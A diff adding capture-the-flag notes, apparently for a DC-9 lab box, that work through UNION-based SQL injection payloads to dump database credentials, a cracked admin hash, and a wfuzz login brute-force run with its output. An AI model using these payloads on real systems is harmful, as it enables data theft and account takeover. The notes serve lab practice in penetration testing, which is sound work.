@@ -91,3 +91,107 @@ search=Mary' UNION SELECT group_concat(SCHEMA_NAME),2,3,4,5,6 FROM information_s
 Result: 
 ID: information_schema,Staff,users
 
+5. Gathering information about Staff and Users
+- This request gives me all the table names 
+search=Mary' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables-- -
+
+Refining this to the Staff instance with 
+search=Mary' UNION SELECT group_concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.tables where table_schema = "Staff"-- -
+
+- Staff has the following tables: 
+  StaffDetailss
+  Users
+ 
+Using this to get columns
+search=Mary' UNION SELECT group_concat(COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = "Staff"-- -
+
+- Staff has the following columns: 
+  id,
+  firstname,
+  lastname,
+  position,
+  phone, 
+  email,
+  reg_date,
+  UserID,
+  Username,
+  Password
+
+Using this to get the relationships within Staff 
+search=Mary' UNION SELECT group_concat(TABLE_NAME,":",COLUMN_NAME),2,3,4,5,6 FROM information_schema.columns where table_schema = "Staff"-- -
+
+saved in db_details
+
+6. Extract Users Passwords from instances
+search=Mary' UNION SELECT group_concat(Username,":",PAssword),2,3,4,5,6 FROM Staff.Users-- -
+
+and
+
+search=Mary' UNION SELECT group_concat(username,":",password),2,3,4,5,6 FROM users.UserDetails-- -
+
+All usernames and passwords are strored in users
+
+7. The admin password is an md5 hash
+856f5de590ef37314e7c3bdf6f8a66dc:transorbital1
+
+8. Testing logins. 
+NOTE there is no CSRF token present on login. 
+
+POST /manage.php HTTP/1.1
+Host: 10.0.2.4
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 43
+Origin: http://10.0.2.4
+Connection: close
+Referer: http://10.0.2.4/manage.php
+Cookie: PHPSESSID=cp5i8jidd5t54jmmmqm5ql7ub0
+Upgrade-Insecure-Requests: 1
+
+username=testusername&password=testpassword
+
+Seperate out usernames and passwords with awk: 
+┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
+└─$ awk -F: '{print $1}' users > usernames
+                                                                                                                                                           
+┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
+└─$ awk -F: '{print $2}' users > passwords
+
+Using WFUZZ to test login
+
+┌──(kali㉿kali)-[~/CTF/JvP-prep/sql-inject-LFI/DC-9]
+└─$ wfuzz -c -z file,usernames -z file,passwords -m zip -d 'username=FUZZ&password=FUZ2Z' http://10.0.2.4/manage.php
+
+-c == output with color 
+-z == Payload
+-m == iterate for combining payloads
+-d == POST data
+
+Target: http://10.0.2.4/manage.php
+Total requests: 18
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                   
+=====================================================================
+
+000000016:   200        50 L     93 W       1248 Ch     "scoots - YR3BVxxxw87"                                                                    
+000000001:   302        50 L     87 W       1210 Ch     "admin - transorbital1"                                                                   
+000000002:   200        50 L     93 W       1248 Ch     "marym - 3kfs86sfd"                                                                       
+000000005:   200        50 L     93 W       1248 Ch     "barneyr - RocksOff"                                                                      
+000000008:   200        50 L     93 W       1248 Ch     "wilmaf - Pebbles"                                                                        
+000000014:   200        50 L     93 W       1248 Ch     "monicag - 3248dsds7s"                                                                    
+000000015:   200        50 L     93 W       1248 Ch     "phoebeb - smellycats"                                                                    
+000000003:   200        50 L     93 W       1248 Ch     "julied - 468sfdfsd2"                                                                     
+000000007:   200        50 L     93 W       1248 Ch     "jerrym - B8m#48sd"                                                                       
+000000009:   200        50 L     93 W       1248 Ch     "bettyr - BamBam01"                                                                       
+000000006:   200        50 L     93 W       1248 Ch     "tomc - TC&TheBoyz"                                                                       
+000000004:   200        50 L     93 W       1248 Ch     "fredf - 4sfd87sfd1"                                                                      
+000000017:   200        50 L     93 W       1248 Ch     "janitor - Ilovepeepee"                                                                   
+000000018:   200        50 L     93 W       1248 Ch     "janitor2 - Hawaii-Five-0"                                                                
+000000013:   200        50 L     93 W       1248 Ch     "rossg - ILoveRachel"                                                                     
+000000011:   200        50 L     93 W       1248 Ch     "joeyt - Passw0rd"                                                                        
+000000012:   200        50 L     93 W       1248 Ch     "rachelg - yN72#dsd"                                                                      
+000000010:   200        50 L     93 W       1248 Ch     "chandlerb - UrAG0D!"                                                                     
